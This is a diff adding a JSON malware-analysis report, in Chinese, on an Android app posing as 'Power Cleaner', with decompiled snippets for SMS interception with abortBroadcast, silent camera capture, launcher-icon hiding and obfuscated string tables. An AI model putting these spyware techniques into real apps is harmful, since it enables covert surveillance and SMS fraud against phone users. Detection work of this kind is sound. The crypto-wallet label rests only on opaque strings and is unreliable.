@@ -1,0 +1,189 @@
+{
+  "APK信息": {
+    "文件名": "6a4801ef931f274e160d60f0f809f0af3a4f8a56ce5bc0552d146b664c86f4aa.apk",
+    "sha256": "6a4801ef931f274e160d60f0f809f0af3a4f8a56ce5bc0552d146b664c86f4aa",
+    "包名": "com.antivirus.power.cleaner",
+    "应用名": "Power Cleaner",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1021.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f762a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信广播 android.provider.Telephony.SMS_RECEIVED，在收到短信时首先调用 abortBroadcast() 终止广播继续传播，导致系统短信应用和其他应用无法收到并展示该短信（用户对短信无感知）。随后从 Intent extras 中取出 pdus 数据并解析为 SmsMessage 对象，提取发件人地址（getDisplayOriginatingAddress）及短信内容。数据流向：系统短信广播（source）→ abortBroadcast() 隐藏短信 + 解析窃取短信内容/发件人（sink）。这种拦截短信行为可被用于窃取验证码/OTP、隐藏扣费确认短信，配合厂商报告所述的伪装成安全工具并窃取用户数据的行为，属于典型恶意短信拦截。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cgl;",
+          "method_signature": "if(this.c != null && !this.c.isRecycled()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "cgl.this.f3855a = surfaceView.getHolder(); cgl.this.f3855a.setType(3); cgl.this.a(cgl.this.f3855a); if (cgl.this.b != null) { Thread.sleep(500L); cgl.this.b.takePicture(null, null, cgl.this.k); }",
+          "malicious_code_snippet_context": "cgl.this.f3855a = surfaceView.getHolder(); cgl.this.f3855a.setType(3); cgl.this.a(cgl.this.f3855a); if (cgl.this.b != null) { Thread.sleep(500L); cgl.this.b.takePicture(null, null, cgl.this.k); }",
+          "behavior_description": "该代码在后台线程（Looper.prepare()创建消息循环）中通过SurfaceView获取SurfaceHolder并设置setType(3)（SURFACE_TYPE_PUSH_BUFFERS，可在无可见预览界面的情况下进行画面捕获），随后调用this.a(holder)打开摄像头，Thread.sleep(500)等待摄像头初始化完成后，调用Camera.takePicture(null, null, this.k)在无任何用户交互、无界面提示的情况下静默拍照，照片数据通过JPEG回调this.k（onPictureTaken）接收。结合厂商报告确认该样本会秘密收集用户数据，此为典型的间谍软件静默偷拍行为，拍摄的照片极可能被保存并上传至远程服务器，直接造成用户隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\a\\c;",
+          "method_signature": "if(!TextUtils.isEmpty(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String strC = iVar.c();\nif (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n    return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n}",
+          "malicious_code_snippet_context": "  \n      private Intent b(i iVar) {\n          if (!TextUtils.isEmpty(iVar.a()) && com.facebook.ads.internal.util.f.a(this.b, iVar.a())) {\n>>>             String strC = iVar.c();\n>>>             if (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n>>>                 return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n>>>             }\n              PackageManager packageManager = this.b.getPackageManager();\n              if (TextUtils.isEmpty(iVar.b()) && TextUtils.isEmpty(strC)) {\n                  return packageManager.getLaunchIntentForPackage(iVar.a());",
+          "behavior_description": "该代码位于Facebook Audience Network广告SDK（com.facebook.ads.internal）的广告点击跳转处理逻辑中。当广告配置对象的目标URI（由远程广告服务器下发的广告数据）以tel:或telprompt:开头时，代码构造ACTION_CALL意图——与调起拨号界面供用户确认的ACTION_DIAL不同，ACTION_CALL被启动后会不经拨号界面确认直接拨打电话。数据流向：远程广告配置数据(iVar.c())→Uri.parse()→ACTION_CALL Intent（静默拨号）。在本样本（厂商报告确认的广告类恶意软件，强制弹广告并收集数据）中，用户误触广告即可能触发直接拨号，存在产生意外通话费用的风险；但该代码本身属于广告SDK标准的点击拨打电话广告处理逻辑，需同时满足广告目标为tel:链接、用户点击广告、应用持有CALL_PHONE权限等条件才会触发，故判定为灰色行为、中等风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cdy;",
+          "method_signature": "if(componentName == null)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static boolean a(Context context, ComponentName componentName, boolean z) {\n    if (componentName == null) { return false; }\n    context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n    return true;\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static boolean a(Context context, ComponentName componentName, boolean z) {\n>>>         if (componentName == null) {\n>>>             return false;\n>>>         }\n>>>         try {\n              context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {",
+          "behavior_description": "该代码是典型的应用图标隐藏实现。方法接收一个 ComponentName（通常为应用的启动器 Activity 组件）和布尔开关 z，通过 PackageManager.setComponentEnabledSetting() 动态修改组件启用状态：当 z 为 false 时将组件设置为 COMPONENT_ENABLED_STATE_DISABLED（值2），使应用图标从桌面启动器中消失，用户无法看到也无法常规卸载该应用；当 z 为 true 时恢复 COMPONENT_ENABLED_STATE_DEFAULT（值0）重新显示图标；标志位 1（DONT_KILL_APP）保证切换状态时不杀死进程，实现无感隐藏。数据流向：componentName（应用主入口/launcher 组件）→ setComponentEnabledSetting(componentName, DISABLED, DONT_KILL_APP) → 应用图标被隐藏、逃避用户察觉与卸载。结合厂商报告，该样本伪装成安全工具（Security Defender 等）暗中窃取用户数据、追踪位置并推送广告，隐藏图标正是为了让恶意行为在用户无感知的情况下持续运行，属于明确的恶意隐匿/持久化手段（代码位于混淆类 ns.cdy 中，进一步印证刻意隐蔽意图）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "15EB31CED2D9A8EFA2B2C924798273E3",
+          "3447CA69ECC65C251FF41241E62BBD39",
+          "UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8="
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\avc;",
+          "method_signature": "s()",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String s() {\n    return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\";\n}",
+          "malicious_code_snippet_context": "          return \"PTvHnZSJMQCs0mkDCz2LAi9ymjZwU9RstmiIqfwzvqTiwfV/PWGw4xSnULJR5z4d\";\n      }\n  \n>>>     public static String s() {\n>>>         return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\";\n>>>     }\n  \n      public static String t() {\n          return \"vgrvc9YBWhwZtRW5xKP3tXwq8T9o3U2EY99is612WSYXB1uhffw25BqnJpLhCcRJ\";",
+          "behavior_description": "该代码位于高度混淆的类 ns\\avc 中，是一组静态方法（q/r/s/t/u）返回Base64编码的加密字符串。这些字符串经过解密后可能包含C2服务器地址、加密密钥或用于检测加密钱包地址的正则模式/配置数据。方法s()返回一个32字节的加密数据块，作为恶意软件混淆字符串表的一部分，被调用方解密后用于恶意操作（如钱包地址匹配、数据回传等）。这种字符串混淆技术是恶意软件常用的反分析手段，用于隐藏其真实意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
